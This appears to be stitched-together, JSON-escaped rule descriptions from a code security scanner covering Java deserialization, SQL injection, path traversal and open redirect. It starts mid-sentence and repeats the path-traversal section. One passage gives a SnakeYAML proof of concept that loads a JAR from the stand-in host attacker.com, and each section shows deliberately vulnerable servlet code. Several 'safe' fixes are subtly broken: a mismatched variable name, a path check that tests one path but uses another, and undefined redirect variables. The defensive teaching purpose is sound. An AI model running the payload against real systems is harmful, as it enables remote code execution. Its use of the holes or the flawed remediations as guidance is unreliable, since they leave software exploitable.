A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`.

In some (\"unsafe\") serialization\nprotocols, if an attacker is able to manipulate the serialized data, they\nmay be able to execute arbitrary code or perform other malicious actions\nwhen the data is deserialized.\n\n### Vulnerable example\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n    String configBase64 = request.getParameter(\"config\");\n    byte[] configData = Base64.getDecoder().decode(configBase64);\n\n    ByteArrayInputStream stream = new ByteArrayInputStream(configData);\n    try {\n        ObjectInputStream in = new ObjectInputStream(stream);\n        this.config = (Config)in.readObject();\n    } catch (IOException | ClassNotFoundException e) {\n        response.setStatus(HttpStatus.BAD_REQUEST.value());\n    }\n}\n```\nThe `readObject` function deserializes untrusted data with a potentially dangerous\ndeserializer.\n\n### Remediation\nUse java.io.ObjectInputFilter to sanitize deserialized data:\n```diff\n    ObjectInputStream in = new ObjectInputStream(stream);\n+   ObjectInputFilter filter = ObjectInputFilter.Config.\n+       createFilter(\"com.example.Config;!*\");\n+   in.setObjectInputFilter(filter);\n    this.config = (Config)in.readObject();\n```\nAdding a filter prevents the attacker from executing arbitrary code or\nperform other malicious actions when the data is deserialized.\n"

      "scannerDescription": "\n### Overview\nSQL injection is a type of vulnerability that allows an attacker to execute arbitrary SQL\ncommands on a database.\nThis can allow the attacker to gain access to sensitive information,\nsuch as user credentials or sensitive data, or to perform unauthorized actions,\nsuch as deleting or modifying data.\n\n### Vulnerable example\n```java\npublic class sqli_vuln {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n        throws ServletException, IOException {\n        Connection connection;\n        String query = \"SELECT userID FROM users WHERE username = \"\n                + request.getParameter(\"username\");\n        try {\n            Statement statement = connection.createStatement();\n            ResultSet results = statement.executeQuery( query );\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\nIn this example, the SQL query is tainted by user-provided parameter,\nand an attacker can inject SQL commands to the database.\n\n### Remediation\n```diff\npublic class sqli_safe {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        + String query = \"SELECT userID FROM users WHERE username = ?\";\n        Connection connection;\n        - String query = \"SELECT userID FROM users WHERE username = \"\n        -         + request.getParameter(\"username\");\n        try {\n            Statement statement = connection.createStatement();\n        -     ResultSet results = statement.executeQuery( query );\n        - } catch (Exception e) {\n        +     PreparedStatement pStmt = connection.prepareStatement( query );\n        +     pStmt.setString( 1, request.getParameter(\"username\"));\n        +     ResultSet results = pstmt.executeQuery( );\n        + } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\nBy using a prepared statement, and passing the username as a parameter for the sql\nstatement, we make sure that the user-provided data is sanitized, as an attacker\ncannot pass sql commands as part of this parameter.\n",

Allowing arbitrary write access is\nmore severe and in most cases leads to arbitrary code execution, via\nediting important system files or sensitive data.\n\n### Vulnerable example\n```java\npublic class path_traversaLvuln {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String DOCS_FOLDER = \"/srv/www/docs\";\n        String docName = request.getParameter(\"doc\");\n        Path docPath = Paths.get(DOCS_FOLDER, docName);\n        File docFile = docPath.toFile();\n        FileUtils.copyFile(docFile, response.getOutputStream());\n    }\n}\n```\nIn this example, an attacker can inject a back-path, that will get anywhere\nin the system, using \"../../\".\n\n### Remediation\n```diff\npublic class path_traversal_safe {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String DOCS_FOLDER = \"/srv/www/docs\";\n        String docName = request.getParameter(\"doc\");\n        Path docPath = Paths.get(DOCS_FOLDER, docName);\n        + Path normDocPath = docPath.normalize();\n        + // Make sure the canonical path resides in the desired dir\n        + if (normDocPath.startsWith(DOCS_FOLDER)) {\n            File docFile = docPath.toFile();\n            FileUtils.copyFile(docFile, response.getOutputStream());\n        + }\n    }\n}\n```\nBy checking that the folder name still starts with the predefined prefix, we\nmake sure that the attacker is not able to back-path outside of the allowed\nfolder.\n",

Allowing arbitrary write access is\nmore severe and in most cases leads to arbitrary code execution, via\nediting important system files or sensitive data.\n\n### Vulnerable example\n```java\npublic class path_traversaLvuln {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String DOCS_FOLDER = \"/srv/www/docs\";\n        String docName = request.getParameter(\"doc\");\n        Path docPath = Paths.get(DOCS_FOLDER, docName);\n        File docFile = docPath.toFile();\n        FileUtils.copyFile(docFile, response.getOutputStream());\n    }\n}\n```\nIn this example, an attacker can inject a back-path, that will get anywhere\nin the system, using \"../../\".\n\n### Remediation\n```diff\npublic class path_traversal_safe {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String DOCS_FOLDER = \"/srv/www/docs\";\n        String docName = request.getParameter(\"doc\");\n        Path docPath = Paths.get(DOCS_FOLDER, docName);\n        + Path normDocPath = docPath.normalize();\n        + // Make sure the canonical path resides in the desired dir\n        + if (normDocPath.startsWith(DOCS_FOLDER)) {\n            File docFile = docPath.toFile();\n            FileUtils.copyFile(docFile, response.getOutputStream());\n        + }\n    }\n}\n```\nBy checking that the folder name still starts with the predefined prefix, we\nmake sure that the attacker is not able to back-path outside of the allowed\nfolder.\n",

This can allow an attacker to\nredirect a user to a malicious website via a trusted website, potentially\ntricking the user into providing sensitive information or downloading\nmalware.\n\n### Vulnerable example\n```java\npublic class open_redirect_vuln {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String url = request.getParameter(\"url\");\n        response.sendRedirect(url);\n    }\n}\n```\nIn this example, a request parameter is incorporated without validation\ninto a URL redirect.\n\n### Remediation\n```diff\npublic class open_redirect_safe {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String url = request.getParameter(\"url\");\n        - response.sendRedirect(url);\n        + if (url.equals(protocol + \"://\" + hostname + \"/login\")) {\n        +     response.sendRedirect(url);\n        + }\n    }\n}\n```\nHere we make sure that the redirection is limited to a url that starts\nwith a known prefix, and ends with a known suffix, which prevents an attacker to\nredirect outside of out network.\n",
